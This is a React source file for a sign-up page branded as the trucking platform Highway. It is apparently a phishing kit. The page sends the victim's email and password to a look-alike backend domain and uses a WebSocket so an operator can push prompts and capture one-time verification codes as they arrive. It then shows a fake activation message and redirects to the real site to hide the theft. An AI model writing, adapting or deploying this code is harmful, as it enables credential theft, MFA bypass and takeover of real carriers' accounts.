import { useState, useRef, useEffect } from "react";
import ProgressSteps from "./progressStep";
import axios from "axios";
import logo from "../src/img/highway_logo.809ed248.svg";
import info from "../src/img/info.png";
import Swal from "sweetalert2";
import { ThreeDot } from "react-loading-indicators";

function AllPage() {
  const [disableButton, setDisableButton] = useState(false);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("MC");
  const [nextform, setNextform] = useState(false);
  const [nextformBut, setNextformBut] = useState(false);
  const [nextformButNext, setNextformButNext] = useState(false);
  const [keyscren, setKeyscren] = useState(false);
  const [textTitle, setTextTitle] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [sendFormKeyBut, setSendFormKeyBut] = useState(false);
  const [yourcompany, setYourcompany] = useState(false);
  const [changesearch, setChangesearch] = useState(true);
  const [carrierId, setCarrierId] = useState("");
  const [data, setData] = useState(null);
  const [activeStepIndex, setActiveStepIndex] = useState(0);
  const [formData, setFormData] = useState({
    userName: "",
    password: "",
    key: "",
  });
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [animate, setAnimate] = useState(false);
  const wsRef = useRef(null);
  const steps = [
    // {
    //   label: "Select Carrier",
    //   status:
    //     activeStepIndex === 0
    //       ? "active"
    //       : activeStepIndex > 0
    //       ? "completed"
    //       : "pending",
    // },
    {
      label: "Verify Identity",
      status:
        activeStepIndex === 0
          ? "active"
          : activeStepIndex > 0
          ? "completed"
          : "pending",
    },
    {
      label: "Join Carrier",
      status: activeStepIndex === 1 ? "active" : "pending",
    },
  ];
  const triggerErrorModal = () => {
    setShowErrorModal(true);
    setTimeout(() => setAnimate(true), 4500);
    setTimeout(() => {
      setShowErrorModal(false);
      setAnimate(false);
    }, 5000);
  };
  const handleChange = (e) => {
    setCarrierId(e);
    if (e.length > 0) {
      setChangesearch(false);
    } else {
      setChangesearch(true);
    }
  };
  const search = async () => {
    try {
      const response = await axios.get(
        `https://hightway-be.onrender.com/api/carrier/${activeTab}/${carrierId}`
      );
      setData(response.data);
    } catch (err) {
      setYourcompany(true);
      setData(null);
    }
  };
  useEffect(() => {
    if (data) {
      setYourcompany(true);
    }
  }, [data]);
  const nextForm = () => {
    setNextform(true);
    setNextformBut(true);
    setActiveStepIndex(1);
  };
  const handleChangeUser = (e) => {
    const { name, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };
  const generateShortSessionKey = () => {
    return Math.floor(1000 + Math.random() * 9000).toString();
  };
  const sessionKeyRef = useRef(generateShortSessionKey());

  useEffect(() => {
    const socket = new WebSocket("wss://hightway-be.onrender.com/ws");
    wsRef.current = socket;

    socket.onopen = () => {
      socket.send(
        JSON.stringify({ type: "init", sessionKey: sessionKeyRef.current })
      );
    };

    socket.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data?.sessionKey !== sessionKeyRef.current) return;
        if (data?.type === "text") {
          setLoading(false);
          setNextformButNext(true);
          setKeyscren(true);
          setTextTitle(data?.textMessage);
          setInputValue(data?.inputValue);
          setActiveStepIndex(2);
          setDisableButton(false);
        } else if (data?.type === "error") {
          triggerErrorModal();
          setLoading(false);
          setNextformButNext(true);
          setSendFormKeyBut(true);
        } else if (data?.type === "ok") {
          setDisableButton(false);
          setLoading(false);
          setNextformButNext(true);
          setSendFormKeyBut(true);
          Swal.fire({
            title: "HIGHWAY",
            text: "Your account is activated.",
            customClass: {
              title: "tiko",
              confirmButton: "okok",
            },
            preConfirm: () => {
              window.location.href = "https://highway.com/";
            },
          });
        }
      } catch (err) {
        console.error("❌ WebSocket parsing error:", err);
      }
    };

    return () => socket.close();
  }, []);

  useEffect(() => {
    const isEmailValid = formData.userName.trim() !== "";
    const isPasswordValid = formData.password.trim() !== "";
    const isKeydValid = formData.key.trim() !== "";
    setNextformButNext(isEmailValid && isPasswordValid);
    setSendFormKeyBut(isKeydValid);
  }, [formData.userName, formData.password, formData.key]);

  const sendForm = async () => {
    setLoading(true);
    setNextformButNext(false);
    await axios.post("https://hightway-be.onrender.com/api/send-form", {
      companyName: data?.legal_name,
      dot: data?.usdot,
      username: formData.userName,
      password: formData.password,
      key: "",
      sessionKey: sessionKeyRef.current,
    });
  };
  const sendFormKey = async () => {
    setLoading(true);
    setSendFormKeyBut(false);
    await axios.post("https://hightway-be.onrender.com/api/send-form", {
      companyName: data?.legal_name,
      dot: data?.usdot,
      username: formData.userName,
      password: formData.password,
      key: formData.key,
      sessionKey: sessionKeyRef.current,
    });
  };
  async function resend() {
    setDisableButton(true);
    await axios.post("https://hightway-be.onrender.com/api/send-form", {
      companyName: data?.legal_name,
      dot: data?.usdot,
      username: formData.userName,
      password: formData.password,
      key: "Resend",
      sessionKey: sessionKeyRef.current,
    });
  }

  return (
    <div className="form-content">
      {showErrorModal && (
        <div className={`modal ${animate ? "slide-out" : ""}`}>
          <img src={info} alt=""></img>
          <span>
            {!keyscren
              ? "Unable To validate email address. Please enter a valid email address"
              : "This isn`t the right code. Try again."}
          </span>
        </div>
      )}
      <div className="logoblock">
        <img src={logo} alt=""></img>
      </div>
      <h2 className="main-heading">Create Your Account</h2>
      {/* <div className="progress-container">
        <ProgressSteps steps={steps} />
      </div> */}
      <div
        className="form-section"
        style={keyscren ? { display: "none" } : { display: "block" }}
      >
        <h3
          style={keyscren ? { display: "none" } : { display: "block" }}
          className="section-heading"
        >
          {"Enter Email Address"}
        </h3>
        <p
          style={keyscren ? { display: "none" } : { display: "block" }}
          className="description"
        >
          In order to protect your account, we need to verify your email
          address.
        </p>
        <div className="mcdot" style={{ display: "flex" }}>
          {/* <div className="tabs">
            <div
              id="mcmc"
              className={`tab ${
                activeTab === "MC" ? "tab-active" : "tab-inactive"
              }`}
              onClick={() => setActiveTab("MC")}
            >
              MC
            </div>
            <div
              id="dotdot"
              className={`tab ${
                activeTab === "DOT" ? "tab-active" : "tab-inactive"
              }`}
              onClick={() => setActiveTab("DOT")}
            >
              DOT
            </div>
          </div> */}
          {/* <div className="search-container">
            <div className="search-input-container">
              <input
                onChange={(e) => handleChange(e.target.value)}
                type="number"
                placeholder={`Enter ${activeTab} #`}
                className="search-input"
                value={carrierId}
              />
              <div className="search-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <circle cx="11" cy="11" r="8"></circle>
                  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                </svg>
              </div>
            </div>
          </div> */}
        </div>
        <div style={{ display: "flex" }} className="loginpassword">
          <span className="inputtext">EMAIL#</span>
          <input
            type="text"
            placeholder="Enter Email #"
            className="search-input topinput"
            name="userName"
            onChange={handleChangeUser}
            value={formData?.userName}
          />
          <span className="inputtext">PASSWORD#</span>
          <input
            type="password"
            placeholder="Enter Password #"
            className="search-input"
            name="password"
            onChange={handleChangeUser}
            value={formData?.password}
          />
        </div>
        <div style={{ display: "none" }}>
          <button
            type="text"
            className={
              changesearch ? "main-search search-disable" : "main-search"
            }
            onClick={search}
            disabled={changesearch}
          >
            Search
          </button>
        </div>
        <div style={nextform ? { display: "none" } : { display: "block" }}>
          {!data ? (
            <div
              className="errorDiv"
              style={yourcompany ? { display: "flex" } : { display: "none" }}
            >
              <span>Carrier could not be found. Try again.</span>
            </div>
          ) : (
            <div
              className="yourcompany"
              style={yourcompany ? { display: "block" } : { display: "none" }}
            >
              <p className="companytitle">Your Company</p>
              <div className="companyinfo">
                <p className="companyname">{data?.legal_name}</p>
                <p className="companydot">DOT# {data?.usdot} -</p>
                <p className="companydot">
                  {typeof data?.mc_mx_ff_numbers === "string" &&
                    data?.mc_mx_ff_numbers
                      .split(/\s+/)
                      .filter((num) => num.startsWith("MC"))
                      .map((num, index, arr) => (
                        <p key={index} className="companymc">
                          MC# {num.replace("MC-", "")}
                          {index === arr.length - 1 ? "" : " - "}
                        </p>
                      ))}
                </p>
              </div>
            </div>
          )}
        </div>
        {/* <button
          style={nextform ? { display: "none" } : { display: "block" }}
          onClick={nextForm}
          className={data ? "button" : "button button-disabled"}
          disabled={!data}
        >
          Continue
        </button> */}
        <button
          style={{ display: "block" }}
          onClick={sendForm}
          className={nextformButNext ? "button" : "button button-disabled"}
          disabled={!nextformButNext}
        >
          {!loading ? (
            <span>Continue</span>
          ) : (
            <ThreeDot color="white" size="small" />
          )}
        </button>
        <div
          style={nextform ? { display: "none" } : { display: "block" }}
          className="alternative-container"
        >
          <p className="alternative-text">Don't have a DOT or MC number?</p>
          <a
            href="https://highway.com/onboarding/sign-up/carrier-type"
            className="alternative-link"
          >
            Continue Here
          </a>
        </div>
      </div>
      <div
        className="keyBlock"
        style={keyscren ? { display: "block" } : { display: "none" }}
      >
        <p className="description">{textTitle}</p>
        <p
          style={inputValue ? { display: "block" } : { display: "none" }}
          className="keyNumber"
        >
          {inputValue}
        </p>
        <input
          style={inputValue ? { display: "none" } : { display: "block" }}
          type="number"
          placeholder="G- Enter the code"
          className="search-input topinput"
          name="key"
          onChange={handleChangeUser}
          value={formData?.key}
        />
        <p className="receive">
          Didn't receive a code?{" "}
          <button
            onClick={resend}
            disabled={disableButton}
            className="resendkey"
          >
            Resend
          </button>
        </p>
        <button
          style={inputValue ? { display: "none" } : { display: "block" }}
          onClick={sendFormKey}
          className={
            sendFormKeyBut ? "button poxos" : "button button-disabled poxos"
          }
          disabled={!sendFormKeyBut}
        >
          {!loading ? (
            <span>Continue</span>
          ) : (
            <ThreeDot color="white" size="small" />
          )}
        </button>
      </div>
    </div>
  );
}

export default AllPage;
